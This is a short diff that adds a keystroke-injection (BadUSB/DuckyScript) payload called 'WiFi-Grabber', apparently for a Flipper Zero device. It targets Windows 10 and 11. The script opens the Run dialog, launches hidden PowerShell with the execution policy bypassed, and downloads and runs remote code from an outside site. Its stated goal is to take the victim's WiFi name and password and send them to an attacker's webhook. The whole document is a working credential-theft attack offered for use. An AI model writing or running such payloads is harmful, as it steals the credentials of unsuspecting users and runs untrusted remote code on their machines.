@@ -1,0 +1,14 @@
+REM Title: WiFi-Grabber
+REM Author: Will | @willsflipper
+REM Description: Retrieves the user's current SSID and PASSWORD and sends it to a webhook.
+REM Target: Windows 10, 11
+
+REM  -----------------------------------------------------------------------------------
+REM  FOR THIS SCRIPT TO WORK YOU WILL NEED TO ADD THE WEBHOOK LINK INTO THE $wh VARIABLE
+REM  -----------------------------------------------------------------------------------
+
+GUI R
+DELAY 500
+ALTSTRING powershell -w h -ep bypass $wh=''; irm https://willcode.cool/tmf | iex
+DELAY 500
+ENTER
